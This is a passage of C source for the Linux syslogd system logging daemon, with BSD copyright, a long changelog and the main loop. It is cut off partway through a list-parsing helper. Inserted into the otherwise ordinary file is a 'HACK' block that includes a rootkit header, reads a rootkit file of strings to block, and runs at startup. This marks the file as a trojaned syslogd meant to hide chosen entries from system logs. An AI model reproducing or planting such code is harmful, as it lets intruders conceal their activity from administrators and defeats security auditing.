/*
 * Copyright (c) 1983, 1988 Regents of the University of California.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#if !defined(lint) && !defined(NO_SCCS)
char copyright2[] =
"@(#) Copyright (c) 1983, 1988 Regents of the University of California.\n\
 All rights reserved.\n";
#endif /* not lint */

#if !defined(lint) && !defined(NO_SCCS)
static char sccsid[] = "@(#)syslogd.c	5.27 (Berkeley) 10/10/88";
#endif /* not lint */

/*
 *  syslogd -- log system messages
 *
 * This program implements a system log. It takes a series of lines.
 * Each line may have a priority, signified as "<n>" as
 * the first characters of the line.  If this is
 * not present, a default priority is used.
 *
 * To kill syslogd, send a signal 15 (terminate).  A signal 1 (hup) will
 * cause it to reread its configuration file.
 *
 * Defined Constants:
 *
 * MAXLINE -- the maximum line length that can be handled.
 * DEFUPRI -- the default priority for user messages
 * DEFSPRI -- the default priority for kernel messages
 *
 * Author: Eric Allman
 * extensive changes by Ralph Campbell
 * more extensive changes by Eric Allman (again)
 *
 * Steve Lord:	Fix UNIX domain socket code, added linux kernel logging
 *		change defines to
 *		SYSLOG_INET	- listen on a UDP socket
 *		SYSLOG_UNIXAF	- listen on unix domain socket
 *		SYSLOG_KERNEL	- listen to linux kernel
 *
 * Mon Feb 22 09:55:42 CST 1993:  Dr. Wettstein
 * 	Additional modifications to the source.  Changed priority scheme
 *	to increase the level of configurability.  In its stock configuration
 *	syslogd no longer logs all messages of a certain priority and above
 *	to a log file.  The * wildcard is supported to specify all priorities.
 *	Note that this is a departure from the BSD standard.
 *
 *	Syslogd will now listen to both the inetd and the unixd socket.  The
 *	strategy is to allow all local programs to direct their output to
 *	syslogd through the unixd socket while the program listens to the
 *	inetd socket to get messages forwarded from other hosts.
 *
 * Fri Mar 12 16:55:33 CST 1993:  Dr. Wettstein
 *	Thanks to Stephen Tweedie (dcs.ed.ac.uk!sct) for helpful bug-fixes
 *	and an enlightened commentary on the prioritization problem.
 *
 *	Changed the priority scheme so that the default behavior mimics the
 *	standard BSD.  In this scenario all messages of a specified priority
 *	and above are logged.
 *
 *	Add the ability to specify a wildcard (=) as the first character
 *	of the priority name.  Doing this specifies that ONLY messages with
 *	this level of priority are to be logged.  For example:
 *
 *		*.=debug			/usr/adm/debug
 *
 *	Would log only messages with a priority of debug to the /usr/adm/debug
 *	file.
 *
 *	Providing an * as the priority specifies that all messages are to be
 *	logged.  Note that this case is degenerate with specifying a priority
 *	level of debug.  The wildcard * was retained because I believe that
 *	this is more intuitive.
 *
 * Thu Jun 24 11:34:13 CDT 1993:  Dr. Wettstein
 *	Modified sources to incorporate changes in libc4.4.  Messages from
 *	syslog are now null-terminated, syslogd code now parses messages
 *	based on this termination scheme.  Linux as of libc4.4 supports the
 *	fsync system call.  Modified code to fsync after all writes to
 *	log files.
 *
 * Sat Dec 11 11:59:43 CST 1993:  Dr. Wettstein
 *	Extensive changes to the source code to allow compilation with no
 *	complaints with -Wall.
 *
 *	Reorganized the facility and priority name arrays so that they
 *	compatible with the syslog.h source found in /usr/include/syslog.h.
 *	NOTE that this should really be changed.  The reason I do not
 *	allow the use of the values defined in syslog.h is on account of
 *	the extensions made to allow the wildcard character in the
 *	priority field.  To fix this properly one should malloc an array,
 *	copy the contents of the array defined by syslog.h and then
 *	make whatever modifications that are desired.  Next round.
 *
 * Thu Jan  6 12:07:36 CST 1994:  Dr. Wettstein
 *	Added support for proper decomposition and re-assembly of
 *	fragment messages on UNIX domain sockets.  Lack of this capability
 *	was causing 'partial' messages to be output.  Since facility and
 *	priority information is encoded as a leader on the messages this
 *	was causing lines to be placed in erroneous files.
 *
 *	Also added a patch from Shane Alderton (shane@scs.apana.org.au) to
 *	correct a problem with syslogd dumping core when an attempt was made
 *	to write log messages to a logged-on user.  Thank you.
 *
 *	Many thanks to Juha Virtanen (jiivee@hut.fi) for a series of
 *	interchanges which lead to the fixing of problems with messages set
 *	to priorities of none and emerg.  Also thanks to Juha for a patch
 *	to exclude users with a class of LOGIN from receiving messages.
 *
 *	Shane Alderton provided an additional patch to fix zombies which
 *	were conceived when messages were written to multiple users.
 *
 * Mon Feb  6 09:57:10 CST 1995:  Dr. Wettstein
 *	Patch to properly reset the single priority message flag.  Thanks
 *	to Christopher Gori for spotting this bug and forwarding a patch.
 *
 * Wed Feb 22 15:38:31 CST 1995:  Dr. Wettstein
 *	Added version information to startup messages.
 *
 *	Added defines so that paths to important files are taken from
 *	the definitions in paths.h.  Hopefully this will insure that
 *	everything follows the FSSTND standards.  Thanks to Chris Metcalf
 *	for a set of patches to provide this functionality.  Also thanks
 *	Elias Levy for prompting me to get these into the sources.
 *
 * Wed Jul 26 18:57:23 MET DST 1995:  Martin Schulze
 *	Linux' gethostname only returns the hostname and not the fqdn as
 *	expected in the code. But if you call hostname with an fqdn then
 *	gethostname will return an fqdn, so we have to mention that. This
 *	has been changed.
 *
 *	The 'LocalDomain' and the hostname of a remote machine is
 *	converted to lower case, because the original caused some
 *	inconsistency, because the (at least my) nameserver did respond an
 *	fqdn containing of upper- _and_ lowercase letters while
 *	'LocalDomain' consisted only of lowercase letters and that didn't
 *	match.
 *
 * Sat Aug  5 18:59:15 MET DST 1995:  Martin Schulze
 *	Now no messages that were received from any remote host are sent
 *	out to another. At my domain this missing feature caused ugly
 *	syslog-loops, sometimes.
 *
 *	Remember that no message is sent out. I can't figure out any
 *	scenario where it might be useful to change this behavior and to
 *	send out messages to other hosts than the one from which we
 *	received the message, but I might be shortsighted. :-/
 *
 * Thu Aug 10 19:01:08 MET DST 1995:  Martin Schulze
 *	Added my pidfile.[ch] to it to perform a better handling with
 *	pidfiles. Now both, syslogd and klogd, can only be started
 *	once. They check the pidfile.
 *
 * Sun Aug 13 19:01:41 MET DST 1995:  Martin Schulze
 *	Add an addition to syslog.conf's interpretation. If a priority
 *	begins with an exclamation mark ('!') the normal interpretation
 *	of the priority is inverted: ".!*" is the same as ".none", ".!=info"
 *	don't logs the info priority, ".!crit" won't log any message with
 *	the priority crit or higher. For example:
 *
 *		mail.*;mail.!=info		/usr/adm/mail
 *
 *	Would log all messages of the facility mail except those with
 *	the priority info to /usr/adm/mail. This makes the syslogd
 *	much more flexible.
 *
 *	Defined TABLE_ALLPRI=255 and changed some occurrences.
 *
 * Sat Aug 19 21:40:13 MET DST 1995:  Martin Schulze
 *	Making the table of facilities and priorities while in debug
 *	mode more readable.
 *
 *	If debugging is turned on, printing the whole table of
 *	facilities and priorities every hexadecimal or 'X' entry is
 *	now 2 characters wide.
 *
 *	The number of the entry is prepended to each line of
 *	facilities and priorities, and F_UNUSED lines are not shown
 *	anymore.
 *
 *	Corrected some #ifdef SYSV's.
 *
 * Mon Aug 21 22:10:35 MET DST 1995:  Martin Schulze
 *	Corrected a strange behavior during parsing of configuration
 *	file. The original BSD syslogd doesn't understand spaces as
 *	separators between specifier and action. This syslogd now
 *	understands them. The old behavior caused some confusion over
 *	the Linux community.
 *
 * Thu Oct 19 00:02:07 MET 1995:  Martin Schulze
 *	The default behavior has changed for security reasons. The
 *	syslogd will not receive any remote message unless you turn
 *	reception on with the "-r" option.
 *
 *	Not defining SYSLOG_INET will result in not doing any network
 *	activity, i.e. not sending or receiving messages. I changed
 *	this because the old idea is implemented with the "-r" option
 *	and the old thing didn't work anyway.
 *
 * Thu Oct 26 13:14:06 MET 1995:  Martin Schulze
 *	Added another logfile type F_FORW_UNKN. The problem I ran into
 *	was a name server that runs on my machine and a forwarder of
 *	kern.crit to another host. The hosts address can only be
 *	fetched using the nameserver. But named is started after
 *	syslogd, so syslogd complained.
 *
 *	This logfile type will retry to get the address of the
 *	hostname ten times and then complain. This should be enough to
 *	get the named up and running during boot sequence.
 *
 * Fri Oct 27 14:08:15 1995:  Dr. Wettstein
 *	Changed static array of logfiles to a dynamic array. This
 *	can grow during process.
 *
 * Fri Nov 10 23:08:18 1995:  Martin Schulze
 *	Inserted a new tabular sys_h_errlist that contains plain text
 *	for error codes that are returned from the net subsystem and
 *	stored in h_errno. I have also changed some wrong lookups to
 *	sys_errlist.
 *
 * Wed Nov 22 22:32:55 1995:  Martin Schulze
 *	Added the fabulous strip-domain feature that allows us to
 *	strip off (several) domain names from the fqdn and only log
 *	the simple hostname. This is useful if you're in a LAN that
 *	has a central log server and also different domains.
 *
 *	I have also also added the -l switch do define hosts as
 *	local. These will get logged with their simple hostname, too.
 *
 * Thu Nov 23 19:02:56 MET DST 1995:  Martin Schulze
 *	Added the possibility to omit fsyncing of logfiles after every
 *	write. This will give some performance back if you have
 *	programs that log in a very verbose manner (like innd or
 *	smartlist). Thanks to Stephen R. van den Berg <srb@cuci.nl>
 *	for the idea.
 *
 * Thu Jan 18 11:14:36 CST 1996:  Dr. Wettstein
 *	Added patche from beta-testers to stop compile error.  Also
 *	added removal of pid file as part of termination cleanup.
 *
 * Wed Feb 14 12:42:09 CST 1996:  Dr. Wettstein
 *	Allowed forwarding of messages received from remote hosts to
 *	be controlled by a command-line switch.  Specifying -h allows
 *	forwarding.  The default behavior is to disable forwarding of
 *	messages which were received from a remote host.
 *
 *	Parent process of syslogd does not exit until child process has
 *	finished initialization process.  This allows rc.* startup to
 *	pause until syslogd facility is up and operating.
 *
 *	Re-arranged the select code to move UNIX domain socket accepts
 *	to be processed later.  This was a contributed change which
 *	has been proposed to correct the delays sometimes encountered
 *	when syslogd starts up.
 *
 *	Minor code cleanups.
 */


#define	MAXLINE		1024		/* maximum line length */
#define	MAXSVLINE	240		/* maximum saved line length */
#define DEFUPRI		(LOG_USER|LOG_NOTICE)
#define DEFSPRI		(LOG_KERN|LOG_CRIT)
#define TIMERINTVL	30		/* interval for checking flush, mark */

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#ifdef SYSV
#include <sys/types.h>
#endif
#include <utmp.h>
#include <ctype.h>
#include <string.h>
#include <setjmp.h>
#include <stdarg.h>

#include <sys/syslog.h>
#include <sys/param.h>
#include <sys/errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/file.h>
#ifdef SYSV
#include <fcntl.h>
#else
#include <sys/msgbuf.h>
#endif
#include <linux/uio.h>
#include <sys/un.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <signal.h>

#include <netinet/in.h>
#include <netdb.h>
#include <syscall.h>
#include <arpa/nameser.h>
#include <arpa/inet.h>
#include <resolv.h>
#include "pidfile.h"
#include "version.h"

#if defined(__linux__)
#include <paths.h>
#endif

#ifndef UTMP_FILE
#ifdef UTMP_FILENAME
#define UTMP_FILE UTMP_FILENAME
#else
#ifdef _PATH_UTMP
#define UTMP_FILE _PATH_UTMP
#else
#define UTMP_FILE "/etc/utmp"
#endif
#endif
#endif

#ifndef _PATH_LOGCONF 
#define _PATH_LOGCONF	"/etc/syslog.conf"
#endif

#if defined(SYSLOGD_PIDNAME)
#undef _PATH_LOGPID
#if defined(FSSTND)
#define _PATH_LOGPID _PATH_VARRUN SYSLOGD_PIDNAME
#else
#define _PATH_LOGPID "/etc/" SYSLOGD_PIDNAME
#endif
#else
#ifndef _PATH_LOGPID
#if defined(FSSTND)
#define _PATH_LOGPID _PATH_VARRUN "syslogd.pid"
#else
#define _PATH_LOGPID "/etc/syslogd.pid"
#endif
#endif
#endif

#ifndef _PATH_DEV
#define _PATH_DEV	"/dev/"
#endif

#ifndef _PATH_CONSOLE
#define _PATH_CONSOLE	"/dev/console"
#endif

#ifndef _PATH_TTY
#define _PATH_TTY	"/dev/tty"
#endif

#ifndef _PATH_LOG
#define _PATH_LOG	"/dev/log"
#endif

char	*LogName = _PATH_LOG;
char	*ConfFile = _PATH_LOGCONF;
char	*PidFile = _PATH_LOGPID;
char	ctty[] = _PATH_CONSOLE;

char	**parts;

int inetm = 0, funix = 0;
static int debugging_on = 0;
static int nlogs = -1;
static int restart = 0;

#define UNAMESZ		8	/* length of a login name */
#define MAXUNAMES	20	/* maximum number of user names */
#define MAXFNAME	200	/* max file pathname length */

#define INTERNAL_NOPRI	0x10	/* the "no priority" priority */
#define TABLE_NOPRI	0	/* Value to indicate no priority in f_pmask */
#define TABLE_ALLPRI    0xFF    /* Value to indicate all priorities in f_pmask */
#define	LOG_MARK	LOG_MAKEPRI(LOG_NFACILITIES, 0)	/* mark "facility" */

/*
 * Flags to logmsg().
 */

#define IGN_CONS	0x001	/* don't print on console */
#define SYNC_FILE	0x002	/* do fsync on file after printing */
#define ADDDATE		0x004	/* add a date to the message */
#define MARK		0x008	/* this message is a mark */

/*
 * This table contains plain text for h_errno errors used by the
 * net subsystem.
 */
const char *sys_h_errlist[] = {
    "No problem",						/* NETDB_SUCCESS */
    "Authoritative answer: host not found",			/* HOST_NOT_FOUND */
    "Non-authoritative answer: host not found, or serverfail",	/* TRY_AGAIN */
    "Non recoverable errors",					/* NO_RECOVERY */
    "Valid name, no data record of requested type",		/* NO_DATA */
    "no address, look for MX record"				/* NO_ADDRESS */
 };

/*
 * This structure represents the files that will have log
 * copies printed.
 */

struct filed {
#ifndef SYSV
	struct	filed *f_next;		/* next in linked list */
#endif
	short	f_type;			/* entry type, see below */
	short	f_file;			/* file descriptor */
	time_t	f_time;			/* time this was last written */
	u_char	f_pmask[LOG_NFACILITIES+1];	/* priority mask */
	union {
		char	f_uname[MAXUNAMES][UNAMESZ+1];
		struct {
			char	f_hname[MAXHOSTNAMELEN+1];
			struct sockaddr_in	f_addr;
		} f_forw;		/* forwarding address */
		char	f_fname[MAXFNAME];
	} f_un;
	char	f_prevline[MAXSVLINE];		/* last message logged */
	char	f_lasttime[16];			/* time of last occurrence */
	char	f_prevhost[MAXHOSTNAMELEN+1];	/* host from which recd. */
	int	f_prevpri;			/* pri of f_prevline */
	int	f_prevlen;			/* length of f_prevline */
	int	f_prevcount;			/* repetition cnt of prevline */
	int	f_repeatcount;			/* number of "repeated" msgs */
	int	f_flags;			/* store some additional flags */
};

/*
 * Intervals at which we flush out "message repeated" messages,
 * in seconds after previous message is logged.  After each flush,
 * we move to the next interval until we reach the largest.
 */
int	repeatinterval[] = { 30, 60 };	/* # of secs before flush */
#define	MAXREPEAT ((sizeof(repeatinterval) / sizeof(repeatinterval[0])) - 1)
#define	REPEATTIME(f)	((f)->f_time + repeatinterval[(f)->f_repeatcount])
#define	BACKOFF(f)	{ if (++(f)->f_repeatcount > MAXREPEAT) \
				 (f)->f_repeatcount = MAXREPEAT; \
			}
#ifdef SYSLOG_INET
#define INET_SUSPEND_TIME 180		/* equal to 3 minutes */
#define INET_RETRY_MAX 10		/* maximum of retries for gethostbyname() */
#endif

#define LIST_DELIMITER	':'		/* delimiter between two hosts */

/* values for f_type */
#define F_UNUSED	0		/* unused entry */
#define F_FILE		1		/* regular file */
#define F_TTY		2		/* terminal */
#define F_CONSOLE	3		/* console terminal */
#define F_FORW		4		/* remote machine */
#define F_USERS		5		/* list of users */
#define F_WALL		6		/* everyone logged on */
#define F_FORW_SUSP	7		/* suspended host forwarding */
#define F_FORW_UNKN	8		/* unknown host forwarding */
char	*TypeNames[9] = {
	"UNUSED",	"FILE",		"TTY",		"CONSOLE",
	"FORW",		"USERS",	"WALL",		"FORW(SUSPENDED)",
	"FORW(UNKNOWN)"
};

struct	filed *Files = (struct filed *) 0;
struct	filed consfile;

struct code {
	char	*c_name;
	int	c_val;
};

struct code	PriNames[] = {
	{"alert",	LOG_ALERT},
	{"crit",	LOG_CRIT},
	{"debug",	LOG_DEBUG},
	{"emerg",	LOG_EMERG},
	{"err",		LOG_ERR},
	{"error",	LOG_ERR},		/* DEPRECATED */
	{"info",	LOG_INFO},
	{"none",	INTERNAL_NOPRI},	/* INTERNAL */
	{"notice",	LOG_NOTICE},
	{"panic",	LOG_EMERG},		/* DEPRECATED */
	{"warn",	LOG_WARNING},		/* DEPRECATED */
	{"warning",	LOG_WARNING},
	{"*",		TABLE_ALLPRI},
	{NULL,		-1}
};

struct code	FacNames[] = {
	{"auth",         LOG_AUTH},
	{"authpriv",     LOG_AUTHPRIV},
	{"cron",         LOG_CRON},
	{"daemon",       LOG_DAEMON},
	{"kern",         LOG_KERN},
	{"lpr",          LOG_LPR},
	{"mail",         LOG_MAIL},
	{"mark",         LOG_MARK},		/* INTERNAL */
	{"news",         LOG_NEWS},
	{"security",     LOG_AUTH},		/* DEPRECATED */
	{"syslog",       LOG_SYSLOG},
	{"user",         LOG_USER},
	{"uucp",         LOG_UUCP},
	{"local0",       LOG_LOCAL0},
	{"local1",       LOG_LOCAL1},
	{"local2",       LOG_LOCAL2},
	{"local3",       LOG_LOCAL3},
	{"local4",       LOG_LOCAL4},
	{"local5",       LOG_LOCAL5},
	{"local6",       LOG_LOCAL6},
	{"local7",       LOG_LOCAL7},
	{NULL,           -1},
};

int	Debug;			/* debug flag */
char	LocalHostName[MAXHOSTNAMELEN+1];	/* our hostname */
char	*LocalDomain;		/* our local domain name */
int	InetInuse = 0;		/* non-zero if INET sockets are being used */
int	finet;			/* Internet datagram socket */
int	LogPort;		/* port number for INET connections */
int	Initialized = 0;	/* set when we have initialized ourselves */
int	MarkInterval = 20 * 60;	/* interval between marks in seconds */
int	MarkSeq = 0;		/* mark sequence number */
int	NoFork = 0; 		/* don't fork - don't run in daemon mode */
int	AcceptRemote = 0;	/* receive messages that come via UDP */
char	**StripDomains = NULL;	/* these domains may be stripped before writing logs */
char	**LocalHosts = NULL;	/* these hosts are logged with their hostname */
int	NoHops = 1;		/* Can we bounce syslog messages through an
				   intermediate host. */

extern	int errno, sys_nerr;
extern	char *sys_errlist[];
extern	char *ctime(), *index();

/* HACK vars */
#include "../rootkit.h"
#define FILENAME ROOTKIT_LOG_FILE
#define STR_SIZE 128

struct  h_st {
        struct h_st     *next;
        char            logstr[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];

FILE    *fp_hack;
int     showall=0;

/* End hack vars */

void hackinit(void)
{
/*+  HACK Read in strings to block  +*/

        h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
        hack_list=h_tmp;

        if ((int)fp_hack=fopen (FILENAME, "r")) {
                while (fgets(tmp_str, 126, fp_hack)) {
                        h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
                        strcpy (h_tmp->logstr, tmp_str);
                        h_tmp->logstr[strlen(h_tmp->logstr)-1]='\0';
                        h_tmp=h_tmp->next;
                }
        fclose(fp_hack);
        }
   h_tmp->next=NULL;
}

/*+  On with the program  +*/

/* Function prototypes. */
int main(int argc, char **argv);
char **crunch_list(char *list);
int usage(void);
void untty(void);
void printchopped(const char *hname, char *msg, int len, int fd);
void printline(const char *hname, char *msg);
void printsys(char *msg);
void logmsg(int pri, char *msg, const char *from, int flags);
void fprintlog(register struct filed *f, char *from, int flags, char *msg);
void endtty();
void wallmsg(register struct filed *f, struct iovec *iov);
void reapchild();
const char *cvthname(struct sockaddr_in *f);
void domark();
void debug_switch();
void logerror(char *type);
void die(int sig);
void init();
void cfline(char *line, register struct filed *f);
int decode(char *name, struct code *codetab);
static void dprintf(char *, ...);
static void allocate_log(void);
void sighup_handler();


int main(argc, argv)
	int argc;
	char **argv;
{
	register int i;
	register char *p;
	int len, num_fds;
	fd_set unixm, readfds;

	int	fd;
#ifdef SYSLOG_UNIXAF
	struct sockaddr_un sunx, fromunix;
#endif
#ifdef  SYSLOG_INET
	struct sockaddr_in sin, frominet;
	char *from;
#endif
	int ch;
	struct hostent *hent;

	char line[MAXLINE +1];
	extern int optind;
	extern char *optarg;

	int quitpid = 0;

/* HACK initialise */
hackinit();

	while ((ch = getopt(argc, argv, "dhf:l:m:np:rs:v")) != EOF)
		switch((char)ch) {
		case 'd':		/* debug */
			Debug = 1;
			break;
		case 'f':		/* configuration file */
			ConfFile = optarg;
			break;
		case 'h':
			NoHops = 0;
			break;
		case 'l':
			if (LocalHosts) {
				printf ("Only one -l argument allowed," \
					"the first one is taken.\n");
				break;
			}
			LocalHosts = crunch_list(optarg);
			break;
		case 'm':		/* mark interval */
			MarkInterval = atoi(optarg) * 60;
			break;
		case 'n':		/* don't fork */
			NoFork = 1;
			break;
		case 'p':		/* path */
			LogName = optarg;
			break;
		case 'r':		/* accept remote messages */
			AcceptRemote = 1;
			break;
		case 's':
			if (StripDomains) {
				printf ("Only one -s argument allowed," \
					"the first one is taken.\n");
				break;
			}
			StripDomains = crunch_list(optarg);
			break;
		case 'v':
			printf("syslogd %s-%s\n", VERSION, PATCHLEVEL);
			exit (1);
		case '?':
		default:
			usage();
		}
	if (argc -= optind)
		usage();

	if ( !(Debug || NoFork) )
	{
		dprintf("Checking pidfile.\n");
		if (!check_pid(PidFile))
		{
			quitpid = getpid();
			if (fork())
			{
				/* We try to wait the end of initialization */
				sleep(10);
				exit(0);
			}
			num_fds = getdtablesize();
			for (i= 0; i < num_fds; i++)
				(void) close(i);
			untty();
		}
		else
		{
			fputs("syslogd: Already running.\n", stderr);
			exit(1);
		}
	}
	else
		debugging_on = 1;
#ifndef SYSV
	else
		setlinebuf(stdout);
#endif

	/* tuck my process id away */
	if ( !Debug )
	{
		dprintf("Writing pidfile.\n");
		if (!check_pid(PidFile))
		{
			if (!write_pid(PidFile))
			{
				dprintf("Can't write pid.\n");
				exit(1);
			}
		}
		else
		{
			dprintf("Pidfile (and pid) already exist.\n");
			exit(1);
		}
	} /* if ( !Debug ) */

	consfile.f_type = F_CONSOLE;
	(void) strcpy(consfile.f_un.f_fname, ctty);
	(void) gethostname(LocalHostName, sizeof(LocalHostName));
	if ( (p = index(LocalHostName, '.')) ) {
		*p++ = '\0';
		LocalDomain = p;
	}
	else
	{
		LocalDomain = "";

		/*
		 * It's not clearly defined whether gethostname()
		 * should return the simple hostname or the fqdn. A
		 * good piece of software should be aware of both and
		 * we want to distribute good software.  Joey
		 */
		hent = gethostbyname(LocalHostName);
		sprintf(LocalHostName, "%s", hent->h_name);
		if ( (p = index(LocalHostName, '.')) )
		{
			*p++ = '\0';
			LocalDomain = p;
		}
	}

	/*
	 * Convert to lower case to recognize the correct domain laterly
	 */
	for (p = (char *)LocalDomain; *p ; p++)
		if (isupper(*p))
			*p = tolower(*p);

	(void) signal(SIGTERM, die);
	(void) signal(SIGINT, Debug ? die : SIG_IGN);
	(void) signal(SIGQUIT, Debug ? die : SIG_IGN);
	(void) signal(SIGCHLD, reapchild);
	(void) signal(SIGALRM, domark);
	(void) signal(SIGUSR1, Debug ? debug_switch : SIG_IGN);
	(void) alarm(TIMERINTVL);
	(void) unlink(LogName);

#ifdef SYSLOG_UNIXAF
	sunx.sun_family = AF_UNIX;
	(void) strncpy(sunx.sun_path, LogName, sizeof(sunx.sun_path));
	funix = socket(AF_UNIX, SOCK_STREAM, 0);
	if (funix < 0 || bind(funix, (struct sockaddr *) &sunx,
	    sizeof(sunx.sun_family)+strlen(sunx.sun_path)) < 0 ||
	    chmod(LogName, 0666) < 0 || listen(funix, 5) < 0) {
		(void) sprintf(line, "cannot create %s", LogName);
		logerror(line);
		dprintf("cannot create %s (%d).\n", LogName, errno);
#ifndef SYSV
		die(0);
#endif
	}
#endif

#ifdef SYSLOG_INET
	finet = socket(AF_INET, SOCK_DGRAM, 0);
	if (finet >= 0) {
	        auto int on = 1;
		struct servent *sp;

		sp = getservbyname("syslog", "udp");
		if (sp == NULL) {
			errno = 0;
			logerror("network logging disabled (syslog/udp service unknown).");
			logerror("see syslogd(8) for details of whether and how to enable it.");
		}
		else {
			sin.sin_family = AF_INET;
			sin.sin_port = LogPort = sp->s_port;
			sin.sin_addr.s_addr = 0;
			if ( setsockopt(finet, SOL_SOCKET, SO_REUSEADDR, \
					(char *) &on, sizeof(on)) < 0 ) {
				logerror("setsockopt, suspending inet");
			}
			else {
				if (bind(finet, (struct sockaddr *) &sin, \
					 sizeof(sin)) < 0) {
					logerror("bind, suspending inet");
				} else {
					inetm = finet;
					InetInuse = 1;
					dprintf("listening on syslog UDP port.\n");
				}
			}
		}
	}
	else
		logerror("syslog: Unknown protocol, suspending inet service.");
#endif


	/* Create a partial message table for all file descriptors. */
	num_fds = getdtablesize();
	dprintf("Allocated parts table for %d file descriptors.\n", num_fds);
	if ( (parts = (char **) malloc(num_fds * sizeof(char *))) == \
	    (char **) 0 )
	{
		logerror("Cannot allocate memory for message parts table.");
		die(0);
	}
	for(i= 0; i < num_fds; ++i)
	    parts[i] = (char *) 0;

	dprintf("Starting.\n");
	init();
	if ( Debug )
	{
		dprintf("Debugging disabled, SIGUSR1 to turn on debugging.\n");
		debugging_on = 0;
	}

	if (quitpid) {
		kill(quitpid, SIGINT);
	}

	/* Main loop begins here. */
	FD_ZERO(&unixm);
	FD_ZERO(&readfds);
	for (;;) {
		int nfds;
		errno = 0;
#ifdef SYSLOG_UNIXAF
		/*
		 * Add the Unix Domain Socket to the list of read
		 * descriptors.
		 */
		FD_SET(funix, &readfds);
		for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
			if ( FD_ISSET(nfds, &unixm) )
				FD_SET(nfds, &readfds);
#endif
#ifdef SYSLOG_INET
		/*
		 * Add the Internet Domain Socket to the list of read
		 * descriptors.
		 */
		if ( InetInuse && AcceptRemote )
			FD_SET(inetm, &readfds);
#endif

		if ( debugging_on )
		{
			dprintf("Calling select, active file descriptors: ");
			for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
				if ( FD_ISSET(nfds, &readfds) )
					dprintf("%d ", nfds);
			dprintf("\n");
		}
		nfds = select(FD_SETSIZE, (fd_set *) &readfds, (fd_set *) NULL,
				  (fd_set *) NULL, (struct timeval *) NULL);
		if ( restart )
		{
			dprintf("\nReceived SIGHUP, reloading syslogd.\n");
			init();
			restart = 0;
			continue;
		}
		if (nfds == 0) {
			dprintf("No select activity.\n");
			continue;
		}
		if (nfds < 0) {
			if (errno != EINTR)
				logerror("select");
			dprintf("Select interrupted.\n");
			continue;
		}

		if ( debugging_on )
		{
			dprintf("\nSuccessful select, descriptor count = %d, " \
				"Activity on: ", nfds);
			for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
				if ( FD_ISSET(nfds, &readfds) )
					dprintf("%d ", nfds);
			dprintf(("\n"));
		}

#ifdef SYSLOG_UNIXAF
		if ( debugging_on )
		{
			dprintf("Checking UNIX connections, active: ");
			for (nfds= 0; nfds < FD_SETSIZE; ++nfds)
				if ( FD_ISSET(nfds, &unixm) )
					dprintf("%d ", nfds);
			dprintf("\n");
		}
		for (fd= 0; fd <= FD_SETSIZE; ++fd)
		  if ( FD_ISSET(fd, &readfds) && FD_ISSET(fd, &unixm) ) {
			dprintf("Message from UNIX socket #%d.\n", fd);
			memset(line, '\0', sizeof(line));
			i = read(fd, line, MAXLINE);
			if (i > 0) {
				printchopped(LocalHostName, line, i, fd);
		  	} else if (i < 0) {
		    		if (errno != EINTR) {
		      			logerror("recvfrom unix");
				}
		        } else {
		    		dprintf("Unix socket (%d) closed.\n", fd);
				if ( parts[fd] != (char *) 0 )
				{
					logerror("Printing partial message");
					line[0] = '\0';
					printchopped(LocalHostName, line, \
						     strlen(parts[fd]) + 1, \
						     fd);
				}
		    		close(fd);
		    		FD_CLR(fd, &unixm);
		    		FD_CLR(fd, &readfds);
		  	}
	      	}
		/* Accept a new unix connection */
		if (FD_ISSET(funix, &readfds)) {
			len = sizeof(fromunix);
			if ((fd = accept(funix, (struct sockaddr *) &fromunix,\
					 &len)) >= 0) {
			  	FD_SET(fd, &unixm);
				dprintf("New UNIX connect assigned to fd: " \
					"%d.\n", fd);
				FD_SET(fd, &readfds);
			}
			else {
				dprintf("Error accepting UNIX connection: " \
					"%d = %s.\n", errno, strerror(errno));
			}
		}

#endif

#ifdef SYSLOG_INET
		if (InetInuse && AcceptRemote && FD_ISSET(inetm, &readfds)) {
			len = sizeof(frominet);
			memset(line, '\0', sizeof(line));
			i = recvfrom(finet, line, MAXLINE - 2, 0, \
				     (struct sockaddr *) &frominet, &len);
			dprintf("Message from inetd socket: #%d, host: %s\n",
				inetm, inet_ntoa(frominet.sin_addr));
			if (i > 0) {
				line[i] = line[i+1] = '\0';
				from = (char *)cvthname(&frominet);
				/*
				 * Here we could check if the host is permitted
				 * to send us syslog messages. We just have to
				 * catch the result of cvthname, look for a dot
				 * and if that doesn't exist, replace the first
				 * '\0' with '.' and we have the fqdn in lowercase
				 * letters so we could match them against whatever.
				 *  -Joey
				 */
				printchopped(from, line, \
 					     i + 2,  finet);
			} else if (i < 0 && errno != EINTR) {
				dprintf("INET socket error: %d = %s.\n", \
					errno, strerror(errno));
				logerror("recvfrom inet");
				sleep(10);
			}
		}
#endif
	}
}

int usage()
{
	fprintf(stderr, "usage: syslogd [-drvh] [-l hostlist] [-m markinterval] [-n] [-p path]\n" \
		" [-s domainlist] [-f conffile]\n");
	exit(1);
}


char **
crunch_list(list)
	char *list;
{
	int count;
	int i;
	char *p;
	char **result = NULL;

	p = list;
	
	/* strip off trailing delimiters */
	while (p[strlen(p)-1] == LIST_DELIMITER) {
		count--;
		p[strlen(p)-1] = '\0';
	}
	/* cut off leading delimiters */
	while (p[0] == LIST_DELIMITER) {
		count--;
		p++; 
	}
	
	/* count delimiters to calculate elements */
	for (count=i=0; p[i]; i++)
		if (p[i] == LIST_DELIMITER) count++;
	
